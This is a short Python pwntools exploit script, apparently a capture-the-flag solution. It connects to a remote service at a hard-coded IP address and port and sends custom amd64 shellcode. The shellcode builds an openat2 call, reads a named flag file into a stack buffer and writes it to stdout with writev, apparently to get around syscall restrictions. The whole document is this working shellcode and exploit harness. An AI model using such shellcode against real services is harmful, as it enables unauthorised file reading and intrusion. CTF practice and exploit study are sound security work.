from pwn import *

context.arch = 'amd64'

# Set up connection
r = remote('159.89.106.147', 1337)
# r = process('./vuln')

# The filename found from your directory listing
filename = "flag_name_Should_Be_R@ndom_ahahahahahahahahah.txt"

shellcode = asm(f'''
    /* ---------------------------------------------------------
       Step 1: openat2(AT_FDCWD, filename, &how, 24)
       --------------------------------------------------------- */
    
    /* 1a. Build 'struct open_how' on the stack */
    /* We just need 24 bytes of zeros (read-only mode is 0) */
    push 0
    push 0
    push 0
    mov rdx, rsp      /* rdx -> pointer to 'how' struct */
    
    /* 1b. Build the filename on the stack */
    mov rax, 0
    push rax          /* Null terminator */
    {shellcraft.pushstr(filename)}
    mov rsi, rsp      /* rsi -> pointer to filename */
    
    /* 1c. Call openat2 */
    mov rdi, -100     /* AT_FDCWD (current directory) */
    mov r10, 24       /* size of 'how' struct */
    mov rax, 437      /* syscall: openat2 */
    syscall
    
    /* FD is now in RAX. Save it in RDI for the next call */
    mov rdi, rax
    
    /* ---------------------------------------------------------
       Step 2: read(fd, stack_buffer, count)
       --------------------------------------------------------- */
    
    /* We will read into the stack. 
       We need to move RSP down to create space so we don't overwrite our code. */
    sub rsp, 0x100
    
    mov rsi, rsp      /* Buffer: Current Stack Pointer */
    mov rdx, 0x100    /* Count: 256 bytes */
    mov rax, 0        /* syscall: read */
    syscall
    
    /* ---------------------------------------------------------
       Step 3: writev(1, iov, 1)
       --------------------------------------------------------- */
    
    
    
    /* iovec.len = 0x100 */
    mov rax, 0x100
    push rax
    
    /* iovec.base = rsi (which is our buffer on the stack) */
    push rsi
    
    /* Set up arguments for writev */
    mov rsi, rsp      /* rsi -> pointer to iovec struct */
    mov rdi, 1        /* fd: stdout */
    mov rdx, 1        /* iovcnt: 1 struct */
    mov rax, 20       /* syscall: writev */
    syscall
    
    /* Exit cleanly */
    mov rax, 60
    syscall
''')

print(f"[*] Sending payload length: {len(shellcode)}")
r.sendlineafter(b"max 4096 bytes): ", shellcode)
r.interactive()